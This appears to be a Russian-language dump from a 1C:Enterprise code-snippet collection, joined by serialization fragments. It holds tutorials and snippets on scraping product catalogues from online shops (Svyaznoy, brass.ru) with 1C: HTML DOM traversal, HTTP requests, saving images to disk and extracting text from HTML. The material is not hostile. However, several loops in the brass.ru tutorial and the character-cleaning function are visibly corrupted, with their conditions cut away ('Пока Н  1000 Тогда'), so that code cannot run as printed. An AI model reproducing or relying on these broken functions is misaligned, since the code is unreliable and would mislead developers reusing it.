В этой статье я постараюсь описать процесс парсинга сайтов средствами 1С с примером. Это статья не является инструкцией к применению, а лишь демонстрирует возможности 1С. Что мы имеем? 1. Сайт в интернете, на котором располагается список товаров. В моем случае – это интернет магазин салона «Связной» 2. Понимание основ сайтостроения… хотя бы знание HTML тегов 3. Умение кодить в 1С 8 Все вышеперечисленные пункты в арсенале? Тогда читаем далее
Заметка 2018 года: Это очень плохой способ парсинга. Даже не помню были тогда в 1С те средства, которыми можно парсить или нет. Хороший способ есть тут

Для начала парсинга стоит определиться с тем что мы хотим спарсить и какая у нас будет иерархия. В моем случае это - категория сотовых телефонов. Верхний уровень иерархии будет - производители. Почему именно так? Потому что я так захотел. Вы же вправе использовать любую иерархию. Далее нам будут интересны такие поля как: Наименование, Цена, Картинка и Описание... ну и пожалуй захватим операционную систему, чтобы пример получился более наглядным.

Создаем внешнюю обработку. Те, кто не знают как это сделать - дальше могут не читать
Создаем форму обработки с командной панелью снизу и сверху (они могут быть полезными)
Размещаем на ней Панель и обзываем первую страницу ""СамСайт""
Кладем на страницу ""СамСайт"" ПолеHTMLДокумента и обзываем его к примеру ""Сайт""
Переименовываем кнопку ""Выполнить"", которая находится на нижней панели в ""Загрузить сайт""
Описываем процедуру нажатия на эту кнопку так:
ЭлементыФормы.Сайт.Перейти(""http://www.svyaznoy.ru/catalog/phone/224""); //Категория с мобильными телефонами
Проверяем работу нашей обработки. У меня появился сайт связного. А у Вас?

Дальше сложнее. Все еще хочешь парсить сайты? Тогда читай.

Сам парсинг сайта заключается в обходе всех элементов загруженной страницы, выдергивания необходимой информации и запихивания их в табличную часть. Для этого:

Создадим табличную часть ""Производители"" с реквизитами ""Отметка"" (Булево), ""Наименование"" (Строка 100) и ""Ссылка"" (Строка 300).
Добавляем еще одну страницу на панели и обзываем ее ""Производители""
Размещаем на этой странице одноименную табличную часть
Добавляем на нижней панели кнопку ""Заполнить производителей"" с кодом:
Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
    Если Стр.tagName = ""H1"" и Стр.innerText = ""Производители"" Тогда
        Для Каждого опСтр из Стр.nextSibling.children Цикл
            новСтр = Производители.Добавить();
            новСтр.Наименование = опСтр.innerText;
            новСтр.Ссылка = опСтр.firstChild.href;
        КонецЦикла;
        Возврат;
    КонецЕсли;
КонецЦикла;
   Здесь напрашиваются небольшие пояснения:
   tagName - имя HTML тега в HTML документе
   nextSubling - следующий элемент HTML документа от текущего
   children - список дочерних элементов
   firstChild - первый дочерний элемент от текущего

Проверяем. При проверке важно находиться на странице ""СамСайт"", чтобы заполнять производителей

Производители заполнены. Теперь к самим телефонам

Создаем табличную часть ""Товары"" с реквизитами ""Производитель"" (Строка 100), ""Наименование"" (Строка 100), ""Цена"" (Число 10,2), ""Картинка"" (Строка 300), ""Описание"" (Строка Неограниченная), ""ОС"" (строка 100), ""Ссылка"" (Строка,300)
Добавляем еще одну страницу на панели и обзываем ее ""Товары""
Размещаем на этой странице одноименную табличную часть
Добавляем на нижней панели кнопку ""Заполнить товары"" с кодом:
Для Каждого Стр из Производители Цикл
    //Если отметку сняли - то не трогаем этого производителя
    Если Не Стр.Отметка Тогда
        Продолжить;
    КонецЕсли;
    Форма = ПолучитьФорму(""ФормаТоваров"");
    Форма.ЭлементыФормы.Сайт.Перейти(Стр.Ссылка);
    Форма.ТекущийПроизводитель = Стр;
    Форма.ОткрытьМодально();
КонецЦикла;
Создаем форму обработки ""ФормаТоваров""
Кладем на ""ФормаТоваров"" ПолеHTMLДокумента и называем его ""Сайт""
На событие ДкументСформирован у ПоляHTMLДокумента пишем код:
Если ЭлементыФормы.Сайт.Документ.body.all.length>1 Тогда
    ГрузимТовары();
КонецЕсли;
Создаем переменную в модуле формы
Перем ТекущийПроизводитель Экспорт;
Создаем процедуру ГрузимТовары():
Процедура ГрузимТовары()
    Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
        Если Стр.className = ""ct_desc cleared"" Тогда
            новСтр = Товары.Добавить();
            Для Каждого опСтр из Стр.children Цикл
                Если опСтр.className = ""pic_and_comp"" Тогда
                    новСтр.Картинка = СтрЗаменить(Сред(опСтр.firstChild.style.backgroundImage,5),"")"","""")
                КонецЕсли;
                Если опСтр.className = ""name"" Тогда
                    новСтр.Наименование = опСтр.innerText;
                    новСтр.Ссылка = опСтр.firstChild.href;
                КонецЕсли;
                Если опСтр.className = ""price"" Тогда
                    новСтр.Цена = Число(СтрЗаменить(СтрЗаменить(опСтр.innerText,""-"",""""),"" "",""""));
                КонецЕсли;
                Если опСтр.className = ""desc"" Тогда
                    новСтр.Описание = опСтр.innerText;//опСтр.innerHTML - если нужно вместе с тегами
                КонецЕсли;
            КонецЦикла;
        КонецЕсли;
    КонецЦикла;
    Закрыть();
КонецПроцедуры
Проверяем. Все работает.
Дело осталось за ""операционной системой"" и еще надо загрузить картинки. Давайте по порядку. Чтобы получить ""ОС"" нам надо открыть этот товар и считать ""ОС"" оттуда. Для этого делаем следующее:

Добавляем на нижней панели кнопку ""Доп Инфо"" с кодом:
Для Каждого Стр из Товары Цикл
    Форма = ПолучитьФорму(""ФормаДопИнфо"");
    Форма.ЭлементыФормы.Сайт.Перейти(Стр.Ссылка);
    Форма.ТекущийТовар = Стр;
    Форма.ОткрытьМодально();
КонецЦикла;
Создаем форму обработки ""ФормаДопИнфо""
Кладем на ""ФормаДопИнфо"" ПолеHTMLДокумента и называем его ""Сайт""
На событие ДкументСформирован у ПоляHTMLДокумента пишем код:
Если ЭлементыФормы.Сайт.Документ.body.all.length>1 Тогда
    ГрузимДопИнфо();
КонецЕсли;
Создаем переменную в модуле формы
Перем ТекущийТовар Экспорт;
Создаем процедуру ГрузимДопИнфо():
Процедура ГрузимДопИнфо();
    Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
        Если Стр.className = ""card_spec"" Тогда
            Для Каждого опСтр из Стр.children Цикл
                Если Найти(опСтр.innerText,""Операционная система:"") Тогда
                    ТекущийТовар.ОС = СокрЛП(СтрЗаменить(опСтр.innerText,""Операционная система:"",""""));
                КонецЕсли;
            КонецЦикла;
        КонецЕсли;
    КонецЦикла;
    Закрыть();
КонецПроцедуры
Проверяем и переходим к последнему пункту

Заметили как похожи две последние инструкции? То-то же. Стремился к универсальности. Ну и наконец последний этап - сохраним все изображения к примеру на диск ""С"" в папку ""Svyaznoy"". Поехали:

Добавляем на нижней панели кнопку ""Сохранить Картинки"" с кодом:
Для Каждого Стр из Товары Цикл
    путьСамФайл = Лев(Стр.Картинка,Найти(Стр.Картинка,"".jpg/"") + 3);
    самФайл = СтрЗаменить(СтрЗаменить(ПутьСамФайл,""http://static.svyaznoy.ru/upload/iblock/"",""""),""/"","""");
    Стр.Картинка = СохранитьКартинкуСайта(""C:\Svyaznoy"",ПутьСамФайл,СамФайл);
КонецЦикла;
Добавляем функцию СохранитьКартинкуСайта:
Функция СохранитьКартинкуСайта(КаталогСохранения,КартинкаНаСайте,КартинкаУНас)
    ИмяФайлаКартинки = КаталогСохранения + ""\"" + КартинкаУНас;
    ГетЗапрос = Новый COMОбъект(""WinHttp.WinHttpRequest.5.1"");
    ГетЗапрос.SetTimeouts(10000, 10000, 10000, 10000);
    БазовыйУРЛ = КартинкаНаСайте;
    Хидер1 = ""Content-Type"";
    Хидер2 = ""image/jpg""; // Тип рисунка.
    ГетЗапрос.Open(""GET"", БазовыйУРЛ, False); // Синхронный режим.
    ГетЗапрос.setRequestHeader(Хидер1, Хидер2);
    ГетЗапрос.Send();
    СтатусОтправки = ГетЗапрос.status;
    Если СтатусОтправки <> 200 Тогда
        Сообщить(""Ошибка отправки запроса на: ""
                 + КартинкаНаСайте);
        Возврат """";
    КонецЕсли;       

    Стрим = Новый COMОбъект(""ADODB.Stream"");
    Стрим.Mode = 3;
    Стрим.Type = 1;
    Стрим.Open();
    Стрим.Write(ГетЗапрос.responseBody);

    Стрим.SaveToFile(ИмяФайлаКартинки, 2);
    Стрим.Close();
    Возврат ИмяФайлаКартинки;
КонецФункции
На этом наша эпопея с парсингом закончена. Это всего лишь пример того, как это можно сделать. Приложив сюда немного своего кода - можно сделать парсер для любого сайта.

Имея парсер 1С - я могу спарсить все, кроме этого парсера. Имея два парсера 1С - я могу спарсить все :)"}
},
{0,
{"Пример большой 2",0,0,"","Данная статья показывает пример парсинга одного конкретного сайта со своей структурой, на основе которого можно понять суть, методы и без особых проблем парсить другие сайты.
Здесь описано: подключение к серверу, сохранение html-страницы на диск, загрузка и цикличный обход ее структуры, рекурсивный парсинг, загрузка картинок по ссылке на диск.
Задача: научиться парсить сайт на конкретном примере

Будем парсить сайт brass.ru - крупного поставщика фурнитуры

Способ парсинга аналогичен тому, что указан в публикации //infostart.ru/public/88106/ , но имеет другой подход.

Далее следует большое полотно текста вперемешку с кодом, если нет желания читать – внизу можно скачать обработку и сразу разбираться в коде – он прокомментирован.

Следует сразу понять, что не существует универсальных парсеров сайтов, подходящих для всех. Большинство сайтов различаются своей структурой, поэтому для каждого из них существует свой алгоритм вытаскивания информации.

Поехали!

Парсить будем не с помощью элемента ДокументHTML на форме, а с помощью ЧтениеHTML (класс для загрузки html-документа) и ПостроительDOM (класс, загружающий в себя всю структуру и информацию документа). Суть этого метода заключается в том, что нам нужно подключиться к серверу, получить необходимую нам html-страницу (только html-код) и разобрать ее, а не загружать всё содержимое страницы на форму и потом рендерить его.

Практический любой сайт строится таким образом, что он состоит из блоков, которые содержат другие блоки, которые содержат другие блоки и так может повторяться огромное количество раз. Поэтому нам придется заранее узнать имена элементов, которые содержат необходимые нам данные.

Я использовал для этого Google Chrome.

Теоритическая часть

1. Парсим каталоги

Начнем собирать данные. Заходим в каталог товаров, клацаем правой клавишей на список товаров -> Показать код элемента. Видим, что список подкаталогов содержится в элементе TABLE с классом navCatalog, глядим на ссылки на подкаталоги – они представляют из себя элементы A. Это значит, что нам нужно найти элемент TABLE с классом navCatalog и получить из него все элементы A. Если мы перейдем в первый каталог, то увидим, что там есть еще каталоги – это не проблема, ведь эта страница подчиняется все тем же правилам, а наша процедура парсинга каталогов будет рекурсивна.

2. Парсим список товаров

Переходим в следующий подкаталог и, наконец, видим наши товары. Они, конечно, распределены по страницам, но, добавив в ссылку «?SHOWALL_1=1», мы сможем посмотреть весь список товаров из этого каталога. Смотрим код элемента, и видим, что все товары так же заключены в элементе TABLE, но уже с классом catalog. Этот элемент содержит в себе блоки TD с классом item – это и есть блоки с нашими товарами. В каждом из них содержится по два блока DIV с именами img и name – они содержат изображение и имя (ссылку на товар), соответственно. Все, с этой страницы мы вытянули все, что нам было нужно.

3. Парсим страницу товара

Все, что нам осталось найти – ссылка на картинку большого разрешения и описание товара. Переходим на страницу товара, все тем же способом видим, в каком блоке находится картинка (блок DIV класса big) и описание (блок DIV класса text). Все, осталась только техническая часть.

Техническая часть

Данный сайт устроен таким образом, что все товары распределены по каталогам и основная информация с картинками располагается только на страничке товара. Структура похожа на сайт связного (возможно, они на одной платформе). В таком случае, последовательность наших действий:

Парсим страничку каталога верхнего уровня и получаем список остальных каталогов;
Рекурсивно парсим страницы каталогов на подкаталоги;
Парсим подкаталоги нижнего уровня на список товаров;
Парсим страницу каждого товара для получения информации о нем.
На каждом шаге нам нужно будет запоминать информацию с предыдущего, поэтому мы создадим две табличные части – одну для запоминания всех каталогов, содержащих товары, вторую – для запоминания товаров.

Создадим обработку. Добавим реквизиты:

- Сервер (будем хранить адрес нашего сайта);

- КаталогЗагрузки (путь к папке на диске, в которую будут загружаться временные файлы).

Добавим на форму табличную часть «СписокКаталогов» с реквизитами

- Раздел (для хранения имени каталога);

- СсылкаНаСтраницу (для хранения ссылки на каталог).

Будем грузить артикул, наименование, описание и большую картинку.

Добавим на форму табличную часть «Товары» с реквизитами:

- Артикул;

- Наименование;

- Описание;

- СсылкаНаКартинку (будем хранить ссылку на маленькую картинку);

- СсылкаНаТовар (будем хранить ссылку на страницу товара);

- ПутьКФайлу (будем хранить путь к картинке, которую загрузили на диск).

Все реквизиты должны быть типа строка неограниченной длины. Можно добавить реквизит-пометку для обозначения тех строк, которые нам нужно будет загрузить.

Собственно, реквизитов нам больше не нужно, приступим к написанию кода.

В комментариях дали ссылку на отлично расписанный способ получить страницу (я использую его же, но очень худо)

Первым делом грузим и парсим страницу основного каталога – brass.ru/catalog/.

 При открытии формы нам следует запомнить сервер, с которого будем загружать страницы – www.brass.ru (адрес должен выглядеть именно так), каталог на диске. Так же откроем соединение с сервером.

Перем Соединение;
Процедура ПередОткрытием(Отказ, СтандартнаяОбработка)
    Сервер = ""www.brass.ru"";
    КаталогЗагрузки = ""C:/1c82/brass"";
    Соединение = Новый HTTPСоединение(Сервер);
КонецПроцедуры
Так же нам обязательно нужно создать в этом каталоге еще три других, в них будут загружаться временные файлы:

- ""/catalog/""
- ""/temp/""
- ""/img/""

Что бы понять, что будет происходить далее, нужно обязательно при запуске кода смотреть, что из себя прадставляют полученные нами структуры (табличцы значений) ДокументХТМЛ, ЭлементыTABLE, ЭлементыTD и прочие подобные - сразу все встанет на свои места.

Обозначим процедуру (сразу с параметрами, т.к. она будет рекурсивно парсить все каталоги).

Процедура ПропарситьКаталог(Каталог = """", Раздел = """")
    ЧтениеХТМЛ = Новый ЧтениеHTML; 
    ПостроительДОМ = Новый ПостроительDOM;
    //Генерируем имя файла на диске, в который запишется страница сайта
    ИмяФайла = КаталогЗагрузки + ""/catalog/"" + СтрЗаменить(Каталог, ""/"", ""_"") + "".html""; 
    //Загружаем нужную нам страницу в каталог
    Соединение.Получить(Каталог, ИмяФайла);
    //Начинаем чтение нашего файла
    ЧтениеХТМЛ.ОткрытьФайл(ИмяФайла, ""UTF-8""); 
    //Загружаем всю структуру документа в DOM
    ДокументХТМЛ = ПостроительДОМ.Прочитать(ЧтениеХТМЛ);
    
    //Получаем все элементы TABLE
    ЭлементыTABLE = ДокументХТМЛ.ПолучитьЭлементыПоИмени(""TABLE"");
    //Находим в них нужный нам блок, содержащий ссылки на подкаталоги
    Для Каждого ЭлементTABLE из ЭлементыTABLE Цикл
    ОбработкаПрерыванияПользователя();
        Если ЭлементTABLE.ИмяКласса = ""navCatalog"" Тогда
            //Нашли, собираем из него все ссылки (элементы А)
            ЭлементыA = ЭлементTABLE.ПолучитьЭлементыПоИмени(""A"");
            Если ЭлементыA.Количество() > 0 Тогда
                //Начинаем парсить каждую найденную ссылку как каталог этой же процедурой рекурсивно
                Для Каждого ЭлементA из ЭлементыA Цикл
                    ПропарситьКаталог(ЭлементA.Гиперссылка, Раздел + "" / "" + ЭлементA.ТекстовоеСодержимое);
                КонецЦикла;
            Иначе
                //Если ссылок не найдено, значит подкаталогов нет и это конечный подкаталог
                //Добавляем его в нашу табличную часть
                НоваяСтрока = СписокКаталогов.Добавить();
                НоваяСтрока.Раздел = Раздел;
                НоваяСтрока.СсылкаНаСтраницу = Каталог;    
            КонецЕсли;    
        КонецЕсли;
    КонецЦикла;
КонецПроцедуры
Лепим на форму кнопку - при ее нажатии у нас загрузятся все каталоги и заполнится табличная часть каталогов, в событие при нажатии вставляем следующее:

ПропарситьКаталог(""/catalog/"", ""Каталог"");
Поздарвляю, теперь наша обработка может распарсить все каталоги сайта и загрузить их в табличную часть. Нужно нам это для того, что бы при выборе каждого каталога мы могли бы загрузить его содержимое. 

Далее создадим кнопку для загрузки товаров в соответствующую табличную часть и пропишем ей следующий код:

Товары.Очистить();

ЧтениеХТМЛ = Новый ЧтениеHTML(); 
ПостроительДОМ = Новый ПостроительDOM;
//Добавляем к адресу ссылки обозначение, которое позволит нам получить полный список товаров выбранного каталога, а не постранично    
АдресСайта = ЭлементыФормы.СписокКаталогов.ТекущиеДанные.СсылкаНаСтраницу + ""?SHOWALL_1=1"";
//Загружаем страницу с товарами
Соединение.Получить(АдресСайта, КаталогЗагрузки + ""/site.html"");
//Начинаем чтение нашего файла
ЧтениеХТМЛ.ОткрытьФайл(КаталогЗагрузки + ""/site.html"", ""UTF-8""); 
//Загружаем всю структуру документа в DOM
ДокументХТМЛ = ПостроительДОМ.Прочитать(ЧтениеХТМЛ); 

//Получаем все элементы TABLE
ЭлементыTABLE = ДокументХТМЛ.ПолучитьЭлементыПоИмени(""TABLE"");

Для Каждого ЭлементTABLE из ЭлементыTABLE Цикл
    //Находим блок, содержащий все товары
    Если ЭлементTABLE.ИмяКласса = ""catalog"" Тогда
        //Теперь получаем все блоки TD, входящие в блок TABLE класса catalog
        ЭлементыTD = ЭлементTABLE.ПолучитьЭлементыПоИмени(""TD"");
        Для Каждого ЭлементTD из ЭлементыTD Цикл
            //Находим блок каждого товара
            Если ЭлементTD.ИмяКласса = ""item"" Тогда
                //Теперь получаем все блоки DIV, входящие в блок TD класса item
                ЭлементыDIV = ЭлементTD.ПолучитьЭлементыПоИмени(""DIV"");
                //Мы знаем, что в каждом таком блоке лежат еще два блока с картинкой и ссылкой на страницу товара
                Если ЭлементыDIV.Количество() = 2 тогда
                    НоваяСтрока = Товары.Добавить();
                    //Добавили новую строку в табличную часть товары, переходим к её заполнению
                    Для Каждого ЭлементDIV из ЭлементыDIV Цикл
                        //Нашли блок с картинкой маленького разрешения
                        Если ЭлементDIV.ИмяКласса = ""img"" Тогда
                            //Т.к. в этом блоке есть еще один блок, а в нем еще один, то мы можем спокойно обращаться к ним через ПервыйДочерний
                            //Таким образом мы спускаемся вниз по дереву структуры до нужных нам данных
                            НоваяСтрока.СсылкаНаТовар = ЭлементDIV.ПервыйДочерний.Гиперссылка;
                            Если НЕ ЭлементDIV.ПервыйДочерний.ПервыйДочерний = Неопределено Тогда
                                НоваяСтрока.СсылкаНаКартинку = ЭлементDIV.ПервыйДочерний.ПервыйДочерний.Источник;
                            КонецЕсли;
                        КонецЕсли;
                        //Нашли блок с именем товара
                        Если ЭлементDIV.ИмяКласса = ""name"" Тогда
                            //Получаем текстовое содержимое - артикул и наименование в одной строке! Не беда.
                            ПолученнаяСтрока = ЭлементDIV.ТекстовоеСодержимое;
                            //Артикул состоит из цифр и латинских символов, разберем строку по этому принципу
                            Н = 1;
                            Пока Н  1000 Тогда
                                    Прервать;
                                КонецЕсли;
                                Н = Н + 1;
                            КонецЦикла;
                            
                            Артикул = Лев(ПолученнаяСтрока, Н - 1);
                            Если СтрДлина(Артикул) > 0 Тогда
                                Наименование = Прав(ПолученнаяСтрока, СтрДлина(ПолученнаяСтрока) - Н);
                            Иначе
                                Наименование = Прав(ПолученнаяСтрока, СтрДлина(ПолученнаяСтрока) - Н + 1);
                            КонецЕсли;
                            
                            НоваяСтрока.Артикул = Артикул;
                            НоваяСтрока.Наименование = Наименование;
                        КонецЕсли;
                    КонецЦикла;    
                КонецЕсли;
            КонецЕсли;
        КонецЦикла;
    КонецЕсли;
КонецЦикла;
Поздравляю, теперь наша обработка может загрузить все товары из выбранного в первой табличной части каталога!

Следующим шагом создаем кнопку для загрузки дополнительной информации (картинки большого разрешения и описания) путем парсинга страницы товара:

ЧтениеХТМЛ = Новый ЧтениеHTML(); 
ПостроительДОМ = Новый ПостроительDOM;

//Т.к. ссылки на страницы с товарами у нас уже есть в табличной части, то мы просто загружаем и парсим их страницы
Для Каждого Строка из Товары Цикл
    Если Строка.Пометка Тогда
        //Код аналогичен предыдущим этапам, поэтому комментарии излишни
        ИмяФайла = КаталогЗагрузки + ""/temp/site_"" + Строка.НомерСтроки +"".html"";
        Соединение.Получить(Строка.СсылкаНаТовар, ИмяФайла);
        ЧтениеХТМЛ.ОткрытьФайл(ИмяФайла, ""UTF-8"");
        ДокументХТМЛ = ПостроительДОМ.Прочитать(ЧтениеХТМЛ); 
        //Получаем все блоки DIV
        ЭлементыDIV = ДокументХТМЛ.ПолучитьЭлементыПоИмени(""DIV"");
        Для Каждого ЭлементDIV из ЭлементыDIV Цикл
            //Находим интересующий нас блок с картинкой большого разрешения
            Если ЭлементDIV.ИмяКласса = ""big"" Тогда
                Если НЕ ЭлементDIV.ПервыйДочерний = Неопределено Тогда
                    Строка.СсылкаНаКартинку = ЭлементDIV.ПервыйДочерний.Источник;    
                КонецЕсли; 
            КонецЕсли;
            //Находим интересующий нас блок с описанием товара
            Если ЭлементDIV.ИмяКласса = ""text"" Тогда
                //В строке содержатся лишние символы, поэтому просто обрежем их
                ПолученнаяСтрока = ЭлементDIV.ТекстовоеСодержимое;    
                Н = 1;
                Пока Н  1000 Тогда
                        Прервать;
                    КонецЕсли;
                    Н = Н + 1;
                КонецЦикла;
                
                Строка.Описание = Прав(ПолученнаяСтрока, СтрДлина(ПолученнаяСтрока) - Н + 1);
            КонецЕсли;
        КонецЦикла;    
    КонецЕсли;
КонецЦикла;

Отмечаем галочками несколько товаров, жмем кнопку и видим, как загружается описание и ссылка на картинку заменяется новой. 

По сути, текстовые данные мы получили, задача выполнена, но осталось еще загрузка картинок - это будет бонусом и без комментариев кода. Или другой, более эффективный способ сохранения картинки от Поручика

Для этого создадим функцию для загрузки картинки, которая вернет нам путь к ней:

Функция ЗагрузитьКартинку(КаталогСохранения, СсылкаНаКартинку, ИмяКартинки)
    ИмяФайлаКартинки = """";
    Попытка
        ИмяФайлаКартинки = КаталогСохранения + ИмяКартинки;
        Request = Новый COMОбъект(""WinHttp.WinHttpRequest.5.1"");
        Request.SetTimeouts(10000, 10000, 10000, 10000);
        Header1 = ""Content-Type"";
        Header2 = ""image/jpg"";
        Request.Open(""GET"", ""http://"" + СсылкаНаКартинку, False);
        Request.setRequestHeader(Header1, Header1);
        Request.Send();
        СтатусОтправки = Request.status;
        Если СтатусОтправки <> 200 Тогда
            Сообщить(""Ошибка отправки запроса на: "" + СсылкаНаКартинку);
            Возврат """";
        КонецЕсли;        

        Stream = Новый COMОбъект(""ADODB.Stream"");
        Stream.Mode = 3;
        Stream.Type = 1;
        Stream.Open();
        Stream.Write(Request.responseBody);

        Stream.SaveToFile(ИмяФайлаКартинки, 2);
        Stream.Close();
    Исключение
    КонецПопытки;
    Возврат ИмяФайлаКартинки;
КонецФункции

+ нам нужно для всех помеченных строк записать путь к файлу в соответствующее поле. Для это можем в процедуру загрузки дополнительной информации (предыдущая) в обходе строк табличной части добавить следующую строку:

Строка.ПутьКФайлу = ЗагрузитьКартинку(КаталогЗагрузки + ""/img/"", Сервер + Строка.СсылкаНаКартинку, ЗаменитьСимволы(Строка.Артикул) + "".jpg"");
Имена картинок формируются из артикулов, а артикулы могут содержать неприемлимые знаки, избавимся от них функцией ЗаменитьСимволы, которая у нас использована в предыдущем отрывке кода:

Функция ЗаменитьСимволы(мСтрока)
    Строка = СтрЗаменить(мСтрока, """", """");
    Н = 1;
    ДС = СтрДлина(Строка) - 1;
    Пока Н  90) И (КодСимвола(Строка, Н) < 48 ИЛИ КодСимвола(Строка, Н) > 57) И (КодСимвола(Строка, Н) < 97 ИЛИ КодСимвола(Строка, Н) > 122) Тогда
            Строка = СтрЗаменить(Строка, Сред(Строка, Н, 1), ""-"");
        КонецЕсли;
        Н = Н + 1;
    КонецЦикла;
    
    Возврат Строка;
КонецФункции

Алилуя! У нас есть артикул, наименование, описание и картинка в большом разрешении! Осталось только перенести эти данные в номенклатуру, но если вы дошли до этого момента, то, надеюсь, вы это сможете сделать сами.

В заключение лишь скажу, что есть и другие способы парсинга сайта, но этот для меня показался простейшим и эффективным. Здесь достаточно знать структуру сайта и менять лишь алгоритм перебора данных ПостроителяDOM."}
},
{0,
{"Элемент.Документ.documentElement.innerHTML",0,0,"","Процедура ПриСозданииНаСервере(Отказ, СтандартнаяОбработка)
	ПолеСтраницыРеквизит = ""Internet.yandex.ru"";
КонецПроцедуры
&НаКлиенте
Процедура ПолеСтраницыДокументСформирован(Элемент)
	СтрокаП = Элемент.Документ.documentElement.innerHTML;
КонецПроцедуры
"}
},
{0,
{"myOnError",0,0,"","</head> 
    <script type=""text/javascript"">
        window.onerror = myOnError;
        function myOnError(msg, url, lno) {return true}
    </script>    
...
<body>"}
},
{0,
{"ПолучитьТекст и УстановитьТекст",0,0,""," пТекстНовостиHTML = ЭлементыФормы.ТекстНовостиHTML.ПолучитьТекст();    
 ПроверитьБлокировкуДокумента();                                        
 ЭлементыФормы.ТекстНовостиHTML.УстановитьТекст(пТекстНовостиHTML);"}
},
{0,
{"Как получить текст из html",0,0,"","1С 8.x : Как получить текст из html?
Один мой хороший клиент использует встроенный в 1С почтовый клиент.

До этого все работало хорошо, но недавно из-за установки нового банк-клиента на компьютере обновили Internet Explorer до 11 версии - стала появляться ошибка:



Поле объекта не обнаружено innerText

Пришлось немного доработать типовую функцию получения текста из html:

Код 1C v 8.х
 Функция ПреобразоватьТекстИзХТМЛФорматаВПростой(ТекстВФорматеХТМЛ) Экспорт
	Попытка
		НовыйHTMLДокумент = Новый COMОбъект(""HtmlFile"");
		НовыйHTMLДокумент.open(""text/html"");
		НовыйHTMLДокумент.write(ТекстВФорматеХТМЛ);
		НовыйHTMLДокумент.close();
		
		Возврат СтрЗаменить(НовыйHTMLДокумент.all.item(0).innerText, Символ(13), """");
	Исключение	
		Построитель = Новый ПостроительDOM;
		ЧтениеHTML = Новый ЧтениеHTML;
		ЧтениеHTML.УстановитьСтроку(ТекстВФорматеХТМЛ);
		ДокументHTML = Построитель.Прочитать(ЧтениеHTML);
		
		Возврат СокрЛП(ДокументHTML.Тело.ТекстовоеСодержимое);
	КонецПопытки;
КонецФункции   
еще функции пример получения:

Код 1C v 8.х
 // Процедура изменяет признак формат текста письма (Текст, HТМЛ),
// и при этом конвертирует сам текст.
//
// Параметры:
//  ЭУHTML,ЭУТекст - Элементы управления формы, соответственно поле HTML и поле Текст
//  Кнопка - выбранная кнопка ее текст ""Простой текст"" или ""HTML"" новый вид текста письма
//  либо текст кнопки если пометку кнопки менять не требуется, соответственно 
//  вопрос о потере форматирования задаваться не будет
// Возвращаемое значение:
//  Булево, признак выполнения изменения формата
//
Функция удИзменитьФорматТекста(ЭУHTML,ЭУТекст, Кнопка) Экспорт
    Если ТипЗнч(Кнопка) = Тип(""Строка"") Тогда
        НовыйВидТекстаПисьма = Кнопка;
        ЕстьКнопка = Ложь;
    Иначе
        Если Кнопка.Пометка Тогда 
            Возврат Ложь; 
        КонецЕсли;
        НовыйВидТекстаПисьма = Кнопка.Текст;        
        ЕстьКнопка = Истина;
    КонецЕсли;     
        
    Если Найти(НовыйВидТекстаПисьма,""Простой текст"") > 0 Тогда          
        ИсходныйТекст = ЭУHTML.ПолучитьТекст();
        НачалоBODY = Найти(ИсходныйТекст, ""<BODY>"");
        КонецBODY  = Найти(ИсходныйТекст, ""</BODY>"");
        Если ЕстьКнопка и (НачалоBODY > 0 И КонецBODY > 0 И (НачалоBODY + 6) < КонецBODY) Тогда
            СтрокаВопроса = ""Будет потеряно форматирование текста. Продолжить?"";
            ОтветНаВопрос = Вопрос(СтрокаВопроса, РежимДиалогаВопрос.ДаНет, , КодВозвратаДиалога.Нет);
            Если ОтветНаВопрос <> КодВозвратаДиалога.Да Тогда                
                Возврат Ложь;
            КонецЕсли;
        КонецЕсли;
        ФорматТекста = ЭУHTML.Документ.all.item(0).innerText;             
        ЭУТекст.Значение =  СтрЗаменить(ФорматТекста, Символ(13), """");
        ЭУТекст.Видимость = Истина;
        ЭУHTML.Видимость = Ложь;
        ЭУHTML.УстановитьТекст("""");                        
    Иначе
        ФорматХТМЛ = СтрЗаменить(ЭУТекст.Значение, Символы.ПС, ""<BR>"");
    
        ЭУHTML.УстановитьТекст(ФорматХТМЛ);
        ЭУHTML.Видимость = Истина;
        ЭУТекст.Видимость = Ложь;
    КонецЕсли; 
    
    Если ЕстьКнопка Тогда
        Кнопка.Пометка = Истина;         
    КонецЕсли;   
    Возврат Истина;                     


КонецФункции // обИзменитьФорматТекста()   "}
},
{0,
{"ЧтениеHTML через ОткрытьФайл (получит вроде только текст, без тегов)",0,0,"","лАдрес 			= ""http://gran-it.net/updateset.php"";
ЧтениеHTML 		= Новый ЧтениеHTML;
ЧтениеHTML.ОткрытьФайл(лАдрес, ""utf-8"");
ПостроительDOM 	= Новый ПостроительDOM;
ДокументDOM 	= ПостроительDOM.Прочитать(ЧтениеHTML);

Если ДокументDOM.Тело = Неопределено Тогда // Ответ не получен
	Сообщить(""Оу"");
Иначе // Получили ответ
	ТекстСтраницы    = ДокументDOM.Тело.ТекстовоеСодержимое;
КонецЕсли;"}
},
{0,
{"Загрузкить текст страницы (загрузит с HTML тегами)",0,0,"","лАдрес 			= ""http://gran-it.net/updateset.php"";

HTTPСоединение 	= Новый HTTPСоединение(""forum.mista.ru"");
HTTPЗапрос 		= Новый HTTPЗапрос(""/topic.php?id=751707"");
ВременныйФайл 	= ПолучитьИмяВременногоФайла();
HTTPОтвет 		= HTTPСоединение.Получить(HTTPЗапрос);
КодСостояния 	= HTTPОтвет.КодСостояния;
responseText 	= HTTPОтвет.ПолучитьТелоКакСтроку();
Сообщить(responseText);"}
},
{0,
{"Парсер сайта на 1С",0,0,"","Парсер сайта на 1С
https://helpf.pro/faq/view/1435.html

В этой статье я постараюсь описать процесс парсинга сайтов средствами 1С с примером.
Это статья не является инструкцией к применению, а лишь демонстрирует возможности 1С.

Что мы имеем?
1. Сайт в интернете, на котором располагается список товаров. В моем случае – это интернет магазин салона «Связной»
2. Понимание основ сайтостроения… хотя бы знание HTML тегов
3. Умение кодить в 1С 8

Для начала парсинга стоит определиться с тем что мы хотим спарсить и какая у нас будет иерархия. В моем случае это категория сотовых телефонов. Верхний уровень иерархии будет производители. Почему именно так? Потомы что я так захотел. Вы же вправе использовать любую иерархию.

Далее нам будут интересны такие поля как: Наименование, Цена, Картинка и Описание... ну и пожалую захватим операционную систему, чтобы пример получился более наглядным.

1. Создаем внешнюю обработку. Те, кто не знают как это сделать - дальше могут не читать
